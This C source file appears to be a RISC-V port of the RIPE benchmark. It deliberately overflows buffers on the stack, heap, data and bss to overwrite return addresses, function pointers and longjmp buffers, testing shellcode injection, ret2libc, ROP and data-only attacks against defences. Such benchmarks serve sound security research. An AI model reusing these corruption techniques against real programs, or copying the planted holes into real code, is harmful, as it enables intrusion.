/*
 * Standalone RISC-V compatible implementation of RIPE
 *
 * Attack params:
 * --------------
 * technique = direct, indirect
 * inject parameter = ret2libc, shellcode injection, ROP, data only
 * code pointer = return address, function pointer, vulnerable struct, longjmp buffer,
 *         non-control data variable
 * location = stack, heap, data, bss
 * function = memcpy, strcpy, strncpy, strcat, strncat, sprintf, snprintf,
 *         sscanf, homebrew memcpy
 */

#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <limits.h>
#include <stdint.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

#include "ripe_attack_generator.h"
#include "parameters.h"
#include "payload.h"
#include "test_status.h"

#define OLD_BP_PTR   __builtin_frame_address(0)
#define RET_ADDR_PTR ((void **) OLD_BP_PTR - 1)

static bool output_debug_info = true;

static int dummy_function(const char *str);
static void longjmp_destination(jmp_buf longjmp_buffer);
static void homebrew_memcpy(void * dst, const void * src, size_t length);
static void shellcode_target();
static void ret2libc_target();
static void rop_target();
static void dop_target(char * buf, uintptr_t auth);
static void set_low_buffer(char ** buf);
static void integer_overflow(char * buf, uintptr_t iv);
static void data_leak(char *buf);

static char shellcode[12];
static uintptr_t dop_dest = 0xdeadbeef;
static size_t size_shellcode = 12;

static ripe_vulnerable_struct_t data_struct = { "AAAA", &dummy_function };
static char data_buffer1[256] = "d";
static char data_buffer2[8] = "dummy";
static char data_secret[32] = "success. Secret data leaked.\n";
static uintptr_t data_flag = 0700;
static uintptr_t * data_mem_ptr[64] = { (uintptr_t *)&dummy_function };
static uintptr_t *data_mem_ptr_aux = (uintptr_t *)&dummy_function;
static int (* data_func_ptr)(const char *) = &dummy_function;
static jmp_buf data_jmp_buffer = { 1 };

// TODO: get attack values to persist
/* static volatile ripe_attack_form_t attack; */
static ripe_attack_form_t attack;


int
ripe_main()
{
  int option_char;
  jmp_buf stack_jmp_buffer_param;

  set_technique(ATTACK_TECHNIQUE, &attack);
  set_inject_param(ATTACK_INJECT_PARAM, &attack);
  set_code_ptr(ATTACK_CODE_PTR, &attack);
  set_location(ATTACK_LOCATION, &attack);
  set_function(ATTACK_FUNCTION, &attack);

  if (is_attack_possible(attack) == true) {
    STACK_PARAMETER_CALL(perform_attack, &dummy_function, stack_jmp_buffer_param);
  } else {
    exit(ATTACK_IMPOSSIBLE);
  }

  print_line("Back in main");

  return 0;
}

STACK_PARAMETER_FUNCTION(void, perform_attack, 
                          int (*stack_func_ptr_param)(const char *),
                          jmp_buf stack_jmp_buffer_param)
{
  jmp_buf stack_jmp_buffer;
  int (* stack_func_ptr)(const char *);
  uintptr_t * stack_mem_ptr;
  uintptr_t * stack_mem_ptr_aux;
  uintptr_t stack_flag;
  char stack_secret[32];
  char stack_buffer[1024];
  ripe_vulnerable_struct_t stack_struct;
  stack_struct.func_ptr = &dummy_function;

  ripe_vulnerable_struct_t *heap_struct;

  /* Two buffers declared to be able to chose buffer that gets allocated    */
  /* first on the heap. The other buffer will be set as a target, i.e. a    */
  /* heap array of function pointers.                                       */
  char * heap_buffer1;
  char * heap_buffer2;
  char * heap_buffer3;
  uintptr_t *heap_flag;
  uintptr_t *heap_mem_ptr_aux;
  uintptr_t *heap_mem_ptr;
  char *heap_secret;
  int (**heap_func_ptr)(const char *);
  jmp_buf *heap_jmp_buffer;

  static char bss_buffer[256];
  static jmp_buf bss_jmp_buffer;
  static ripe_vulnerable_struct_t bss_struct;
  static int (* bss_func_ptr)(const char *);
  static uintptr_t *bss_flag;
  static uintptr_t *bss_mem_ptr_aux;
  static uintptr_t *bss_mem_ptr;
  static char bss_secret[32];

  char *buffer;
  void *target_addr;
  void *target_addr_aux;
  char format_string_buf[16];
  ripe_payload_t payload;

  heap_struct = malloc(sizeof(ripe_vulnerable_struct_t));
  if(heap_struct == NULL) {
    print_line("Unable to allocate memory for heap struct");
    exit(EXIT_FAILURE);
  }
  heap_struct->func_ptr = dummy_function;

  heap_buffer1 = malloc(256 + sizeof(uintptr_t));
  heap_buffer2 = malloc(256 + sizeof(uintptr_t));
  heap_buffer3 = malloc(256 + sizeof(uintptr_t));
  if(heap_buffer1 == NULL || heap_buffer2 == NULL || heap_buffer3 == NULL) {
    print_line("Unable to allocate memory for heap buffers");
    exit(EXIT_FAILURE);
  }

  heap_flag = malloc(sizeof(*heap_flag));
  if(heap_flag == NULL) {
    print_line("Unable to allocate memory for heap flag variable");
    exit(EXIT_FAILURE);
  }

  heap_func_ptr = malloc(sizeof(*heap_func_ptr));
  if(heap_func_ptr == NULL) {
    print_line("Unable to allocate memory for heap function pointer");
    exit(EXIT_FAILURE);
  }

  heap_jmp_buffer = malloc(sizeof(*heap_jmp_buffer));
  if(heap_jmp_buffer == NULL) {
    print_line("Unable to allocate memory for heap jump buffer");
    exit(EXIT_FAILURE);
  }

  build_shellcode(shellcode);

  INITIALIZE_BUFFER(data_buffer1);
  INITIALIZE_BUFFER(data_buffer2);

  switch (attack.location) {
    case STACK:
      INITIALIZE_BUFFER(stack_buffer);
      strcpy(stack_secret, data_secret);
      if (attack.code_ptr == STRUCT_FUNC_PTR_STACK &&
          attack.technique == DIRECT) {
        buffer = stack_struct.buffer;
      } else if (attack.code_ptr == FUNC_PTR_STACK_PARAM &&
          attack.technique == DIRECT) {
        set_low_buffer(&buffer);
      } else {
        buffer = stack_buffer;
      }

      if (attack.inject_param == DATA_ONLY) {
        stack_mem_ptr = &stack_flag;
      }
      break;

    case HEAP:
      if (attack.code_ptr == STRUCT_FUNC_PTR_HEAP &&
          attack.technique == DIRECT) {
        buffer = heap_struct->buffer;
        break;
      }

      if (((uintptr_t) heap_buffer1 < (uintptr_t) heap_buffer2) &&
          ((uintptr_t) heap_buffer2 < (uintptr_t) heap_buffer3)) {
        buffer = heap_buffer1;
        heap_mem_ptr_aux = (uintptr_t *)heap_buffer2;
        heap_mem_ptr     = (uintptr_t *)heap_buffer3;

        if (attack.code_ptr == VAR_LEAK) {
          heap_secret = heap_buffer2;
          strcpy(heap_secret, data_secret);
        }
      } else {
        print_line("Heap buffers allocated in the wrong order");
        exit(EXIT_FAILURE);
      }

      if (attack.inject_param == DATA_ONLY) {
        heap_mem_ptr = heap_flag;
      }
      break;

    case DATA:
      if (attack.code_ptr == STRUCT_FUNC_PTR_DATA) {
        buffer = data_struct.buffer;
        break;
      }

      if ((attack.code_ptr == FUNC_PTR_DATA ||
            attack.code_ptr == VAR_BOF) &&
          attack.technique == DIRECT) {
        buffer = data_buffer2;
      } else {
        buffer = data_buffer1;
      }

      if (attack.inject_param == DATA_ONLY) {
        data_flag     = 0;
        *data_mem_ptr = &data_flag;
      }
      break;

    case BSS:
      // Force the BSS buffer lower in memory for compilers
      // that order variables by time of access
      INITIALIZE_BUFFER(bss_buffer);

      strcpy(bss_secret, data_secret);

      if (attack.code_ptr == STRUCT_FUNC_PTR_BSS) {
        buffer = bss_struct.buffer;
        break;
      }

      buffer = bss_buffer;

      bss_flag = 0;

      bss_mem_ptr_aux = (uintptr_t *)&dummy_function;
      bss_mem_ptr = (uintptr_t *)&dummy_function;

      if (attack.inject_param == DATA_ONLY) {
        bss_mem_ptr = (uintptr_t *)&bss_flag;
      }
      break;
  }

  if (heap_func_ptr != NULL) {
    *heap_func_ptr = dummy_function;
  }

  switch (attack.technique) {
    case DIRECT:
      switch (attack.code_ptr) {
        case RET_ADDR:
          target_addr = RET_ADDR_PTR;
          break;
        case FUNC_PTR_STACK_VAR:
          target_addr = &stack_func_ptr;
          break;
        case FUNC_PTR_STACK_PARAM:
          target_addr = &stack_func_ptr_param;
          break;
        case FUNC_PTR_HEAP:
          target_addr = heap_func_ptr;
          break;
        case FUNC_PTR_BSS:
          target_addr = &bss_func_ptr;
          break;
        case FUNC_PTR_DATA:
          target_addr = &data_func_ptr;
          break;
        case LONGJMP_BUF_STACK_VAR:
          target_addr = stack_jmp_buffer;
          break;
        case LONGJMP_BUF_STACK_PARAM:
          // TODO: actually fix this attack
          /* target_addr = &stack_jmp_buffer_param; */
          target_addr = stack_jmp_buffer;
          break;
        case LONGJMP_BUF_HEAP:
          target_addr = (void *) heap_jmp_buffer;
          break;
        case LONGJMP_BUF_DATA:
          target_addr = data_jmp_buffer;
          break;
        case LONGJMP_BUF_BSS:
          target_addr = bss_jmp_buffer;
          break;
        case STRUCT_FUNC_PTR_STACK:
          target_addr = &stack_struct.func_ptr;
          break;
        case STRUCT_FUNC_PTR_HEAP:
          target_addr = (void *) heap_struct + 256;
          break;
        case STRUCT_FUNC_PTR_DATA:
          target_addr = &data_struct.func_ptr;
          break;
        case STRUCT_FUNC_PTR_BSS:
          target_addr = &bss_struct.func_ptr;
          break;
        case VAR_BOF:
        case VAR_IOF:
          switch (attack.location) {
            case STACK:
              target_addr = &stack_flag;
              break;
            case HEAP:
              target_addr = heap_flag;
              break;
            case DATA:
              target_addr = &data_flag;
              break;
            case BSS:
              target_addr = &bss_flag;
              break;
          }
          break;
        case VAR_LEAK:
          switch (attack.location) {
            case STACK:
              target_addr = &stack_secret;
              break;
            case HEAP:
              target_addr = heap_secret;
              break;
            case DATA:
              target_addr = &data_secret;
              break;
            case BSS:
              target_addr = &bss_secret;
              break;
          }
          break;

      }
      break;

    case INDIRECT:
      switch (attack.location) {
        case STACK:
          target_addr     = &stack_mem_ptr;
          target_addr_aux = &stack_mem_ptr_aux;
          break;
        case HEAP:
          target_addr     = heap_mem_ptr;
          target_addr_aux = heap_mem_ptr_aux;
          break;
        case DATA:
          target_addr     = &data_mem_ptr;
          target_addr_aux = &data_mem_ptr_aux;
          break;
        case BSS:
          target_addr     = &bss_mem_ptr;
          target_addr_aux = &bss_mem_ptr_aux;
          break;
      }
      break;
  }

  switch (attack.code_ptr) {
    case LONGJMP_BUF_STACK_VAR:
      if (setjmp(stack_jmp_buffer) != 0) {
        print_line("Longjmp attack failed. Returning normally...");
        return;
      }
      payload.jmp_buffer = &stack_jmp_buffer;
      break;
    case LONGJMP_BUF_STACK_PARAM:
      if (setjmp(stack_jmp_buffer_param) != 0) {
        print_line("Longjmp attack failed. Returning normally...");
        return;
      }
      /* payload.jmp_buffer = (jmp_buf *)&stack_jmp_buffer_param; */
      payload.jmp_buffer = (jmp_buf *)stack_jmp_buffer_param;
      break;
    case LONGJMP_BUF_HEAP:
      if (setjmp(*heap_jmp_buffer) != 0) {
        print_line("Longjmp attack failed. Returning normally...");
        return;
      }
      payload.jmp_buffer = (void *) heap_jmp_buffer;
      payload.stack_jmp_buffer_param = 0;
      break;
    case LONGJMP_BUF_DATA:
      if (setjmp(data_jmp_buffer) != 0) {
        print_line("Longjmp attack failed. Returning normally...");
        return;
      }
      payload.jmp_buffer = (void *) data_jmp_buffer;
      payload.stack_jmp_buffer_param = 0;
      break;
    case LONGJMP_BUF_BSS:
      if (setjmp(bss_jmp_buffer) != 0) {
        print_line("Longjmp attack failed. Returning normally...");
        return;
      }
      payload.jmp_buffer = (void *) bss_jmp_buffer;
      payload.stack_jmp_buffer_param = 0;
      break;
    default:
      break;
  }

  payload.ptr_to_correct_return_addr = (uintptr_t *)RET_ADDR_PTR;
  payload.inject_param = attack.inject_param;

  switch (attack.technique) {
    case DIRECT:
      switch (attack.inject_param) {
        case RETURN_INTO_LIBC:
          payload.overflow_ptr = &ret2libc_target;
          break;
        case RETURN_ORIENTED_PROGRAMMING:
          payload.overflow_ptr = &&ROP_DESTINATION;
          break;
        case INJECTED_CODE_NO_NOP:
          payload.overflow_ptr = buffer;
          break;
        case DATA_ONLY:
          payload.overflow_ptr = (void *)0xdeadbeef;
          break;
        default:
          print_line("Unknown choice of attack code");
          exit(EXIT_FAILURE);
      }
      break;
    case INDIRECT:
      /* Here payload.overflow_ptr will point to the final pointer target   */
      /* since an indirect attack first overflows a general pointer that in */
      /* turn is dereferenced to overwrite the target pointer               */
      switch (attack.code_ptr) {
        case RET_ADDR:
          payload.overflow_ptr = RET_ADDR_PTR;
          break;
        case FUNC_PTR_STACK_VAR:
          payload.overflow_ptr = &stack_func_ptr;
          break;
        case FUNC_PTR_STACK_PARAM:
          payload.overflow_ptr = &stack_func_ptr_param;
          break;
        case FUNC_PTR_HEAP:
          payload.overflow_ptr = heap_func_ptr;
          break;
        case FUNC_PTR_BSS:
          payload.overflow_ptr = &bss_func_ptr;
          break;
        case FUNC_PTR_DATA:
          payload.overflow_ptr = &data_func_ptr;
          break;
        case STRUCT_FUNC_PTR_STACK:
          payload.overflow_ptr = &stack_struct.func_ptr;
          break;
        case STRUCT_FUNC_PTR_HEAP:
          payload.overflow_ptr = (void *) heap_struct + 256;
          break;
        case STRUCT_FUNC_PTR_DATA:
          payload.overflow_ptr = &data_struct.func_ptr;
          break;
        case STRUCT_FUNC_PTR_BSS:
          payload.overflow_ptr = &bss_struct.func_ptr;
          break;
        case LONGJMP_BUF_STACK_VAR:
          payload.overflow_ptr = stack_jmp_buffer;
          break;
        case LONGJMP_BUF_STACK_PARAM:
          payload.overflow_ptr = stack_jmp_buffer_param;
          break;
        case LONGJMP_BUF_HEAP:
          payload.overflow_ptr = *heap_jmp_buffer;
          break;
        case LONGJMP_BUF_DATA:
          payload.overflow_ptr = data_jmp_buffer;
          break;
        case LONGJMP_BUF_BSS:
          payload.overflow_ptr = bss_jmp_buffer;
          break;
        case VAR_BOF:
        case VAR_IOF:
        case VAR_LEAK:
          payload.overflow_ptr = &dop_dest;
          break;
        default:
          print_line("Unknown choice of code pointer");
          exit(EXIT_FAILURE);
          break;
      }
      break;
  }

  print_debug("target_addr == %p", target_addr);
  print_debug("buffer == %p", buffer);

  if ((uintptr_t) target_addr > (uintptr_t) buffer) {
    payload.size =
      (size_t) ((uintptr_t) target_addr + sizeof(uintptr_t)
          - (uintptr_t) buffer + 1);

    print_debug("payload_size == %d", payload.size);
  } else {
    print_line("Error calculating size of payload");
    exit(EXIT_FAILURE);
  }

  if (build_payload(&payload, attack, shellcode, sizeof(shellcode)) == false) {
    print_line("Failed to build payload");
    exit(EXIT_FAILURE);
  }

  print_debug("Corrupting memory...");

  switch (attack.function) {
    case MEMCPY:
      memcpy(buffer, payload.buffer, payload.size - 1);
      break;
    case STRCPY:
      strcpy(buffer, payload.buffer);
      break;
    case STRNCPY:
      strncpy(buffer, payload.buffer, payload.size);
      break;
    case SPRINTF:
      sprintf(buffer, "%s", payload.buffer);
      break;
    case SNPRINTF:
      snprintf(buffer, payload.size, "%s", payload.buffer);
      break;
    case STRCAT:
      strcat(buffer, payload.buffer);
      break;
    case STRNCAT:
      strncat(buffer, payload.buffer, payload.size);
      break;
    case SSCANF:
      snprintf(format_string_buf, 15, "%%%ic", payload.size);
      sscanf(payload.buffer, format_string_buf, buffer);
      break;
    case HOMEBREW:
      homebrew_memcpy(buffer, payload.buffer, payload.size - 1);
      break;
    default:
      print_line("Unknown choice of function");
      exit(EXIT_FAILURE);
      break;
  }

  switch (attack.technique) {
    case DIRECT:
      break;
    case INDIRECT:
      // fix sscanf address corruption
      if (attack.function == SSCANF) {
        *(uintptr_t *) target_addr &= 0xffffff00;
      }

      if (attack.inject_param == RETURN_INTO_LIBC) {
        payload.overflow_ptr = &ret2libc_target;
        payload.size = ((uintptr_t) target_addr_aux
          - (uintptr_t) buffer + sizeof(uintptr_t) + 1);
        build_payload(&payload, attack, shellcode, sizeof(shellcode));
        memcpy(buffer, payload.buffer, payload.size - 1);

        switch (attack.location) {
          case STACK:
            *(uintptr_t *) (*(uintptr_t *) target_addr) =
              (uintptr_t) stack_mem_ptr_aux;
            break;
          case HEAP:
            *(uintptr_t *) (*(uintptr_t *) target_addr) =
              (uintptr_t) *heap_mem_ptr_aux;
            break;
          case DATA:
            *(uintptr_t *) (*(uintptr_t *) target_addr) =
              (uintptr_t) data_mem_ptr_aux;
            break;
          case BSS:
            *(uintptr_t *) (*(uintptr_t *) target_addr) =
              (uintptr_t) bss_mem_ptr_aux;
            break;
        }
      } else if (attack.inject_param == INJECTED_CODE_NO_NOP) {
        *(uintptr_t *) (*(uintptr_t *) target_addr) =
          (uintptr_t) buffer;
      }
      break;
    default:
      print_line("Unknown choice of attack parameter");
      exit(EXIT_FAILURE);
      break;
  }

  printf("\nExecuting attack... ");

  switch (attack.code_ptr) {
    case RET_ADDR:
      break;
    case FUNC_PTR_STACK_VAR:
      print_line("attack inject_param: %d", attack.inject_param);
      print_line("attack inject_param: %x", attack.inject_param);
      print_debug("jumping to %p", stack_func_ptr);
      print_debug("rop destination: %p", &&ROP_DESTINATION);
      stack_func_ptr(NULL);
      break;
    case FUNC_PTR_STACK_PARAM:
      ((int (*)(char *, int))(*stack_func_ptr_param))(NULL, 0);
      break;
    case FUNC_PTR_HEAP:
      ((int (*)(char *, int)) * heap_func_ptr)(NULL, 0);
      break;
    case FUNC_PTR_BSS:
      ((int (*)(char *, int))(*bss_func_ptr))(NULL, 0);
      break;
    case FUNC_PTR_DATA:
      ((int (*)(char *, int))(*data_func_ptr))(NULL, 0);
      break;
    case LONGJMP_BUF_STACK_VAR:
      longjmp_destination(stack_jmp_buffer);
      break;
    case LONGJMP_BUF_STACK_PARAM:
      longjmp_destination(stack_jmp_buffer_param);
      break;
    case LONGJMP_BUF_HEAP:
      longjmp_destination(*heap_jmp_buffer);
      break;
    case LONGJMP_BUF_DATA:
      longjmp_destination(data_jmp_buffer);
      break;
    case LONGJMP_BUF_BSS:
      longjmp_destination(bss_jmp_buffer);
      break;
    case STRUCT_FUNC_PTR_STACK:
      ((int (*)(char *, int)) * (stack_struct.func_ptr))(NULL, 0);
      break;
    case STRUCT_FUNC_PTR_HEAP:
      (*heap_struct->func_ptr)(NULL);
      break;
    case STRUCT_FUNC_PTR_DATA:
      (*data_struct.func_ptr)(NULL);
      break;
    case STRUCT_FUNC_PTR_BSS:
      (*bss_struct.func_ptr)(NULL);
      break;
    case VAR_BOF:
    case VAR_IOF:
      switch (attack.location) {
        case STACK:
          dop_target(buffer, *stack_mem_ptr);
          break;
        case HEAP:
          dop_target(buffer, *heap_mem_ptr);
          break;
        case DATA:
          dop_target(buffer, **data_mem_ptr);
          break;
        case BSS:
          dop_target(buffer, *bss_mem_ptr);
          break;
      }
      break;
    case VAR_LEAK:
      data_leak(buffer);
      break;
  }

  if(attack.inject_param == RETURN_ORIENTED_PROGRAMMING) {
    goto PERFORM_ATTACK_DONE;
  }
  else {
    goto ROP_DESTINATION;
  }

ROP_DESTINATION:
  print_line("attack inject_param: %d", attack.inject_param);
  print_line("attack inject_param: %x", attack.inject_param);
  /* if(attack.inject_param == RETURN_ORIENTED_PROGRAMMING) { */
  rop_target();
  /* } */
PERFORM_ATTACK_DONE:
  return;
}

static void
longjmp_destination(jmp_buf longjmp_buffer)
{
  print_debug("longjmp_buffer[0] == %lx\n", longjmp_buffer[0]);
  longjmp(longjmp_buffer, 1111);
}

static int dummy_function(const char *str)
{
  print_line("Dummy function called");
  return 0;
}

static void
homebrew_memcpy(void * dst, const void * src, size_t length)
{
  char * d, * s;

  d = (char *) dst;
  s = (char *) src;

  while (length--) {
    *d++ = *s++;
  }
}

static void
ret2libc_target()
{
  print_line("success.\nRet2Libc function reached.");
  test_pass();
  test_done();
  exit(EXIT_SUCCESS);
}

static void
dop_target(char * buffer, uintptr_t auth)
{
  uintptr_t auth_local = auth;

  if (attack.code_ptr == VAR_IOF) {
    integer_overflow(buffer, (uintptr_t)&auth_local);
  }

  if (auth_local == 0) {
    print_line("DOP attack failed");
  } else {
    print_line("success.\nDOP memory corruption reached.");
    test_pass();
    test_done();
    exit(EXIT_SUCCESS);
  }
}

static void
rop_target()
{
  /* if(attack.inject_param != RETURN_ORIENTED_PROGRAMMING) { */
  /*   return; */
  /* } */
  print_debug("ROP param: %d, my param: %d", RETURN_ORIENTED_PROGRAMMING, attack.inject_param);
  if(attack.inject_param == RETURN_ORIENTED_PROGRAMMING) {
    print_line("success.\nROP function reached.");
    test_pass();
    test_done();
    exit(EXIT_SUCCESS);
  }
}

static void
set_low_buffer(char **buf)
{
  char low_buf[1024];

  print_debug("Setting low buffer");
  *buf = (char *)&low_buf;
}

static void
integer_overflow(char *buffer, uintptr_t seed)
{
  char * map;
  uintptr_t key = seed;
  int8_t len = strlen(buffer);

  // 0-length allocation and dummy hash operations
  print_line("len == %u", len);
  map = malloc(len);
  key -= (uintptr_t) map;
  key &= (uint16_t) len - 1;
  map[key] = 0xa1;
}

static void
data_leak(char *buf) 
{
  uint16_t size = buf[0] + (buf[1] * 0x100), i;
  char *msg = malloc(size);

  memcpy(msg, buf + 2, size);
  for (i = 0; i < size; i++) {
    if(msg[i] >= 0x20) {
      putc(msg[i],stderr);
    }
  }

  putc('\n', stderr);
}	
